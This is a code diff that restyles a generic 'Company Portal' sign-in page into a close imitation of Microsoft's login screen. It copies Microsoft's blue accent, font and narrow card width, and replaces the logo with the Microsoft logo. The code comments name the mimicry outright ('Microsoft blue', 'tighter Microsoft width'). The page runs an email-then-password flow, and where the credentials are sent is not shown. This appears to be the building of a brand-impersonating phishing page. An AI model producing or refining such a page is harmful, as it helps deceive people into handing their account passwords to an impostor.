@@ -6,16 +6,16 @@
 <title>Company Portal — Sign in</title>
 <style>
   :root {
-    --bg:#f3f4f6;
+    --bg:#f3f3f3;
     --card:#fff;
-    --muted:#555;
-    --text:#0b1220;
-    --accent:#2D68C4;
+    --text:#1b1b1b;
+    --muted:#5f6368;
+    --accent:#0078d7; /* Microsoft blue */
     --danger:#e02424;
-    font-family:"Segoe UI",Inter,Roboto,Helvetica,Arial,sans-serif;
+    font-family:"Segoe UI", "Helvetica Neue", Roboto, Arial, sans-serif;
   }
 
-  html, body {
+  html,body {
     height:100%;
     margin:0;
     background:var(--bg);
@@ -27,51 +27,48 @@
 
   .card {
     background:var(--card);
-    border-radius:8px;
-    padding:60px;
+    border-radius:6px;
+    padding:48px 42px 36px;
     width:100%;
-    max-width:600px;
-    box-shadow:0 4px 40px rgba(0,0,0,.08);
+    max-width:420px;  /* 👈 tighter Microsoft width */
+    box-shadow:0 2px 10px rgba(0,0,0,0.1);
     border:1px solid #ddd;
-    transition:all .3s ease;
-    min-height:520px; /* 🔒 Keeps consistent height */
     display:flex;
     flex-direction:column;
     justify-content:center;
+    transition:all .3s ease;
   }
 
   .logo {
-    width:180px;
-    margin:0 auto 40px;
     text-align:center;
+    margin-bottom:30px;
   }
   .logo img {
-    width:100%;
+    width:150px;
     height:auto;
-    display:block;
+    display:inline-block;
   }
 
   h3 {
-    margin:0 0 6px;
-    font-size:26px;
+    margin:0 0 8px;
+    font-size:22px;
     font-weight:600;
-    text-align:center;
+    text-align:left;
   }
-
   p.subtitle {
-    margin:0 0 25px;
+    margin:0 0 22px;
     color:var(--muted);
-    font-size:16px;
-    text-align:center;
+    font-size:15px;
+    text-align:left;
   }
 
   input {
     width:100%;
-    padding:14px 0;
+    padding:12px 0;
     border:none;
     border-bottom:2px solid #ccc;
     background:transparent;
-    font-size:18px;
+    font-size:16px;
     outline:none;
     color:var(--text);
     transition:border-color .2s ease;
@@ -79,55 +76,46 @@
   input:focus { border-color:var(--accent); }
 
   .btn {
-    margin-top:30px;
-    padding:12px 28px;
-    border:0;
-    border-radius:6px;
+    margin-top:25px;
+    padding:10px 24px;
+    border:none;
+    border-radius:0;
     font-weight:600;
-    font-size:16px;
+    font-size:15px;
     background:var(--accent);
     color:#fff;
     cursor:pointer;
     transition:background .15s ease,transform .1s ease;
     float:right;
   }
-  .btn:hover { background:#2150a1; transform:translateY(-1px); }
+  .btn:hover { background:#0063b1; transform:translateY(-1px); }
 
   .error {
     color:var(--danger);
-    font-size:14px;
-    margin-top:8px;
+    font-size:13px;
+    margin-top:6px;
     clear:both;
     min-height:18px;
   }
 
   .small {
-    font-size:14px;
+    font-size:13px;
     color:var(--muted);
-    margin-top:18px;
+    margin-top:16px;
     clear:both;
   }
 
   footer {
-    margin-top:80px;
-    font-size:15px;
+    margin-top:60px;
+    font-size:13px;
     color:var(--muted);
     text-align:center;
   }
   footer a { color:var(--accent); text-decoration:none; font-weight:600; }
 
-  @media(max-width:600px) {
-    .card {
-      padding:40px 20px;
-      max-width:95%;
-      min-height:480px;
-    }
-    .btn {
-      float:none;
-      width:100%;
-      padding:14px;
-      margin-top:28px;
-    }
+  @media(max-width:500px) {
+    .card { padding:40px 20px; max-width:95%; }
+    .btn { float:none; width:100%; margin-top:28px; }
   }
 
   /* popup */
@@ -139,8 +127,8 @@
     transform:translate(-50%,-50%);
     background:var(--accent);
     color:#fff;
-    padding:18px 36px;
-    border-radius:8px;
+    padding:16px 34px;
+    border-radius:6px;
     font-weight:600;
     opacity:0;
     transition:opacity .6s ease;
@@ -151,7 +139,7 @@
 <body>
 <section class="card">
   <div class="logo">
-    <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD..." alt="Company Logo" />
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Company Logo">
   </div>
 
   <h3>Sign in</h3>
@@ -189,7 +177,7 @@
   const pwError = document.getElementById("pwError");
   const popup = document.getElementById("popup");
 
-  // Step 1 — validate email then show password
+  // Step 1 — email validation
   nextBtn.addEventListener("click", () => {
     const email = emailInput.value.trim();
     if (!email) {
@@ -202,7 +190,7 @@
     passwordInput.focus();
   });
 
-  // Step 2 — handle login
+  // Step 2 — login
   document.getElementById("loginForm").addEventListener("submit", async (e) => {
     e.preventDefault();
     pwError.textContent = "";
@@ -228,7 +216,7 @@
     }
   });
 
-  // Dynamic popup
+  // Popup fade
   function showPopup(email) {
     popup.textContent = `✅ Welcome back, ${email}!`;
     popup.style.display = "block";
